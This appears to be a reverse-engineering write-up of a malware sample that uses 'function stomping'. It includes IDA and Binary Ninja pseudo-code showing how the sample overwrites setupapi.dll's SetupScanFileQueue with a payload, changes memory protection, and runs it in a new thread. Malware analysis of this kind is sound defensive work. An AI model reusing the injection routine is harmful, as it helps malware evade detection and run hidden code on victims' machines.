# Summary

This is an other method to avoid the usage of `virtualAlloc/VirtualAllocEx`.  Function stomping overwrite / replace the memory of a local or remote function in a program and fill it with our  payload.  This may make the program unstable.

# IDA Pro Analysis

## Main Subroutine Part 1

At: `1400010c6` "setupapi.dll" is loaded into memory. 

![[Pasted image 20240506105336.png]]

When the handle is valid, the program is going to retrieve the address of the exported function named: **SetupScanFileQueue**

![[Pasted image 20240506105740.png]]


Next the program is going to check if GetProcAddress handle is valid, it does this by comparing its value to `rax` register.

![[Pasted image 20240506110404.png]]

Once the handle of **GetProcAddress** is valid, the function will continue to call another subroutine named **WritePayload**

## WritePayload Subroutine

**WritePayload** subroutine is responsible for injecting the payload into memory. It starts with **VirutalProtect** WinAPI call this enables the program to have write permissions, this is needed for the next step where the program copies the payload(size) into the **pAddress** which holds the base address of the payload. Next, in order to execute the payload it also needs to have EXECUTE permissions, this is done by **VirtualProtect**, but the difference here is: previvous call has READ_WRITE and now it has READ_WRITE_EXECUTE permissions. 

The reason why the malware developer implemented a second **VirtualProtect** is to act as a normal program.

### VirutalProtect 1 Subroutine
![[Pasted image 20240506150905.png]]


### Memcpy & VirutalProtect2 Subroutine

![[Pasted image 20240506150925.png]]

### CreateThread Subroutine
After the payload has been copied at the specified address, the program will create local thread in order to execute this payload. 

![[Pasted image 20240506150544.png]]

After this stage, the thread will wait until the newly created that is done with executing the payload.

![[Pasted image 20240506150750.png]]


## Pseudo-Code 

### WritePayload()
```c
BOOL8 __fastcall WritePayload(unsigned __int8 *pAddress, unsigned __int8 *pPayload, SIZE_T sPayloadSize)
{
  unsigned int flOldProtect; // [rsp+20h] [rbp-28h] BYREF

  flOldProtect = 0;
  if ( !VirtualProtect(pAddress, sPayloadSize, 0x04, &flOldProtect) )// 4 == RW
    return 0;
  qmemcpy(pAddress, pPayload, sPayloadSize);
  return VirtualProtect(pAddress, sPayloadSize, 0x40u, &flOldProtect);
```

### Main()
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned __int8 *pAddress; // [rsp+30h] [rbp-28h]
  HMODULE hModule_setupapi; // [rsp+38h] [rbp-20h]
  HANDLE hThread; // [rsp+40h] [rbp-18h]

  hModule_setupapi = LoadLibraryA(LibFileName); // setupapi.dll
  if ( !hModule_setupapi )
    return -1;
  pAddress = (unsigned __int8 *)GetProcAddress(hModule_setupapi, SetupScanFileQueue);
  if ( !pAddress )
    return -1;
  if ( !WritePayload(pAddress, pPayload, 0x110ui64) )
    return -1;
  hThread = CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)pAddress, 0i64, 0, 0i64);
  if ( hThread )
    WaitForSingleObject(hThread, 0xFFFFFFFF);
  return 0;
```

# Binary Ninja

## Pseudo-Code

### WritePayload()

```c
int32_t WritePayload(void* pAddress, uint8_t* pPayload, uint64_t sPayloadSize)

void var_48
int64_t return = __security_cookie ^ &var_48
enum PAGE_PROTECTION_FLAGS lpflOldProtect = 0
if (VirtualProtect(lpAddress: pAddress, dwSize: sPayloadSize, flNewProtect: PAGE_READWRITE, lpflOldProtect: &lpflOldProtect) != 0)
	__builtin_memcpy(dest: pAddress, src: pPayload, n: sPayloadSize)
	VirtualProtect(lpAddress: pAddress, dwSize: sPayloadSize, flNewProtect: PAGE_EXECUTE_READWRITE, lpflOldProtect: &lpflOldProtect)

return __security_check_cookie(return ^ &var_48)

```

### Main()
```c
int32_t main(...)

int64_t s
__builtin_memset(s: &s, c: 0, n: 0x18)

HMODULE hModule = LoadLibraryA(lpLibFileName: "setupapi.dll")
int32_t return
	if (hModule == 0)
		 return = -1
	else
		void* rax = GetProcAddress(hModule, lpProcName: "SetupScanFileQueue")
		if (rax == 0)
			return = -1
		else if (WritePayload(pAddress: rax, pPayload: &Payload, sPayloadSize: 0x110) == 0)
			return = -1
		else
			HANDLE hHandle = CreateThread(lpThreadAttributes: nullptr, dwStackSize: 0, lpStartAddress: rax, lpParameter: nullptr, dwCreationFlags: THREAD_CREATE_RUN_IMMEDIATELY, lpThreadId: nullptr)
		if (hHandle != 0)
			WaitForSingleObject(hHandle, dwMilliseconds: -1)
			return = 0
return 0

```

# Graph Overview
![[Pasted image 20240506151903.png]]

# Payload

The payload is located at: `140003080` (mine case).

![[Pasted image 20240506152105.png]]